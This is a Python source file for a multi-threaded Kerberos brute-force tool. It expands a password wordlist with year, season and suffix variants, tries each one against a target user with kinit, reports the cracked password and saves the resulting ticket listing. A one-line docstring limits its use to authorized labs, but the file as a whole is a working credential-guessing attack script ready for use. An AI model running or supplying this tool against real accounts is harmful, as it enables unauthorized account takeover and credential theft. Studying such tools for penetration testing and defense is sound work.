#!/usr/bin/env python3
"""
Advanced Kerberos Brute Force Attack Script
Features: Multi-threaded, smart password generation, rate limiting,
progress tracking, result logging, automatic ticket extraction.

⚠️  USE ONLY IN AUTHORIZED LAB ENVIRONMENTS
"""

import subprocess, threading, queue, time, argparse, json, os
from datetime import datetime
from pathlib import Path
from typing import List, Dict
from colorama import Fore, init
init(autoreset=True)

class KerberosBruteForce:
    def __init__(self, realm, kdc, username, password_file,
                 threads=4, delay=1.0, output_dir="bruteforce_results"):
        self.realm = realm.upper()
        self.kdc = kdc
        self.username = username
        self.password_file = password_file
        self.threads = threads
        self.delay = delay
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.password_queue = queue.Queue()
        self.results = []
        self.success = False
        self.lock = threading.Lock()
        self.attempts = 0
        self.start_time = None
        self.stats = {'total_attempts': 0, 'failed_attempts': 0,
                      'successful_attempts': 0, 'errors': 0,
                      'start_time': None, 'end_time': None}

    def load_passwords(self) -> List[str]:
        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords")
            return passwords
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Password file not found: {self.password_file}")
            return []

    def generate_smart_passwords(self, base_passwords: List[str]) -> List[str]:
        variations = []
        current_year = datetime.now().year
        seasons = ['Spring', 'Summer', 'Fall', 'Winter']
        for password in base_passwords:
            variations.append(password)
            for year in range(current_year - 2, current_year + 1):
                variations.extend([f"{password}{year}", f"{password}{str(year)[2:]}"])
            for season in seasons:
                variations.extend([f"{season}{current_year}", f"{season}{str(current_year)[2:]}"])
            for suffix in ['!', '@', '#', '123', '1']:
                variations.append(f"{password}{suffix}")
            variations.extend([password.capitalize(), password.upper()])
        return list(set(variations))

    def attempt_auth(self, password: str) -> Dict:
        principal = f"{self.username}@{self.realm}"
        try:
            result = subprocess.run(['kinit', principal], input=password.encode(),
                capture_output=True, timeout=10,
                env={**os.environ, 'KRB5_CONFIG': '/etc/krb5.conf'})
            with self.lock:
                self.attempts += 1
            if result.returncode == 0:
                return {'success': True, 'username': self.username, 'password': password,
                        'principal': principal, 'timestamp': datetime.now().isoformat(),
                        'attempts': self.attempts}
            return {'success': False, 'username': self.username, 'password': password,
                    'error': result.stderr.decode('utf-8', errors='ignore')[:100],
                    'timestamp': datetime.now().isoformat()}
        except subprocess.TimeoutExpired:
            return {'success': False, 'username': self.username, 'password': password,
                    'error': 'Timeout', 'timestamp': datetime.now().isoformat()}
        except Exception as e:
            return {'success': False, 'username': self.username, 'password': password,
                    'error': str(e), 'timestamp': datetime.now().isoformat()}

    def worker(self, worker_id: int):
        while not self.success:
            try:
                password = self.password_queue.get(timeout=1)
            except queue.Empty:
                break
            result = self.attempt_auth(password)
            with self.lock:
                self.results.append(result)
                if result['success']:
                    self.success = True
                    self.stats['successful_attempts'] += 1
                    print(f"\n{Fore.GREEN}[+] SUCCESS! Password: {result['password']} "
                          f"after {result['attempts']} attempts")
                    self.extract_ticket()
                else:
                    self.stats['failed_attempts'] += 1
            self.password_queue.task_done()
            time.sleep(self.delay)

    def extract_ticket(self):
        try:
            result = subprocess.run(['klist'], capture_output=True, text=True)
            ticket_file = self.output_dir / f"ticket_{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            ticket_file.write_text(result.stdout)
            print(f"{Fore.GREEN}[+] Ticket saved: {ticket_file}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error extracting ticket: {e}")

    def run(self):
        print(f"\n{Fore.CYAN}Target: {self.username}@{self.realm} | KDC: {self.kdc}")
        base_passwords = self.load_passwords()
        if not base_passwords:
            return
        passwords = self.generate_smart_passwords(base_passwords)
        print(f"{Fore.GREEN}[+] Total passwords to test: {len(passwords)}")
        for password in passwords:
            self.password_queue.put(password)
        self.start_time = time.time()
        self.stats['start_time'] = datetime.now().isoformat()
        threads = [threading.Thread(target=self.worker, args=(i,)) for i in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join()
        elapsed = time.time() - self.start_time
        print(f"\n{Fore.CYAN}Attempts: {self.attempts} | Duration: {elapsed:.2f}s | "
              f"Success: {self.success}")

def main():
    parser = argparse.ArgumentParser(description="Advanced Kerberos Brute Force Tool")
    parser.add_argument('-r', '--realm', required=True)
    parser.add_argument('-k', '--kdc', required=True)
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password-file', required=True)
    parser.add_argument('-t', '--threads', type=int, default=4)
    parser.add_argument('-d', '--delay', type=float, default=1.0)
    parser.add_argument('-o', '--output-dir', default='bruteforce_results')
    args = parser.parse_args()
    KerberosBruteForce(args.realm, args.kdc, args.username, args.password_file,
                       args.threads, args.delay, args.output_dir).run()

if __name__ == "__main__":
    main()
